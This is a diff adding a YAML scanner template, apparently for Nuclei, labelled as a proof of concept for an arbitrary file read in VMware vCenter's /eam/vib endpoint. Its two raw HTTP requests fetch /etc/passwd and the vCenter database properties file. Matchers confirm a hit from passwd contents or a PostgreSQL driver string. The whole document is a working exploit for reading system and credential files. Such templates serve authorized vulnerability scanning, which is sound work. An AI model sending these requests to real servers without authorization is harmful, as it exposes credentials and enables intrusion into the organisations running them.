@@ -1,0 +1,39 @@
+id: poc-yaml-vmware-vcenter-arbitrary-file-read
+
+info:
+  name: poc-yaml-vmware-vcenter-arbitrary-file-read
+  author: MrP01ntSun(https://github.com/MrPointSun)
+  severity: critical
+  tags: xray-converted,lfi,ct-158124
+  reference:
+    - https://t.co/LfvbyBUhF5
+
+http:
+  - raw:
+      - |
+        GET /eam/vib?id=/etc/passwd HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: regex
+        part: body
+        regex:
+          - "root:[x*]:0:0:"
+  - raw:
+      - |
+        GET /eam/vib?id=C:\ProgramData\VMware\vCenterServer\cfg\vmware-vpx\vcdb.properties HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "org.postgresql.Driver"
